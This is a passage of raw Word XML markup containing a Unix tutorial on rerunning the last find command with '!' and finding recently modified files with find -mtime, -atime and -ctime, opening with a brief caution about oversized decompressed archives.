        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Once the file is decompressed, hundreds of GB of data is extracted which </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>can fill up your hard drive</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> to bring down the performance of your system. To avoid this situation, always remember to accept data from trustworthy sources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FC53B6"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>1. How to run last executed find command in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28246322"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">will repeat the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>last</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7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> executed. It saves a lot of </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>time</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000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>you re</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> searching for something and you need to execute the same </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> again and again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FBC60D"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
    <w:p w14:paraId="53E9AB20"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javin</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testenv1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java :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br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">"*.java"     --last find command executed </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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OnlineStockTrading.java</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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StockTrading.java</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4656D2A0"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
    <w:p w14:paraId="0BDB2277"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
    <w:p w14:paraId="70C5D6A4"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In fact </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"!"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t> can be used with any </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t> to invoke the previous run of that command, it's one of the special shell characters. If you are not familiar with bash built-in commands and special characters then I strongly suggest you check out</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>Bash Shell Scripting: Crash Course For Beginners</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>. A short course which provides enough information to make most out of bash shell.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And if you don't have a time for an online course then following bash tricks from Julia Evans is the best you can have. Just knowing these tips will improve your speed and productivity in Linux. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C8403F" w14:textId="1D956091" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>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noProof/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="23083136" wp14:editId="5C1B4791">
            <wp:extent cx="5943600" cy="3640455"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31" name="Picture 31" descr="bash tricks for Linux user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sh tricks for Linux users">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4D5595AA"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p>
    <w:p w14:paraId="675B806F"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
    <w:p w14:paraId="3C5B0ED2"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>2. How to find files which have been modified less than one day, minute or hour in Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5468BB" w14:textId="0652AA8D"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noProof/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C54AF66" wp14:editId="5FC792AC">
            <wp:extent cx="476250" cy="476250"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="30" name="Picture 30" descr="unix find command tutorial">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nix find command tutorial">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AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is used to search files based upon modification time. This is, in fact, my </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>favorite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find command tips</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> while looking out some production issues just to </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>check which files have been modified recently</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>, could be likely cause of the issue, believe me, it helps a lot and many times gives you enough hint of any problem due to intended or unintended file change.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Along with –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>, there are two more options related to time, find -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>atime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> which denotes the last accessed time of the file and find –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ctime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> denotes last changed time.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 xml:space="preserve">The + sign is used to search for greater than, - sign is used to search for less than and without a sign is used for exact. For example, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> will search all files which have been modified </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D428AA1"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
    <w:p w14:paraId="1CCCFAE9"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javin</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testenv1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java : </w:t>
      </w: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>(find all the files modified exact 1 day)</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lastRenderedPageBreak/>
        <w:t>javin</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testenv1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java : </w:t>
      </w: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 xml:space="preserve">-1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>(find all the files modified less than 1 day)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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StockTrading.java</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javin</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testenv1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java : </w:t>
      </w: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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> +1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>(find all the files modified more than 1 day)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>vimrc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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OnlineStockTrading.java</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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StockTrading.java~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC28DDD"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b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
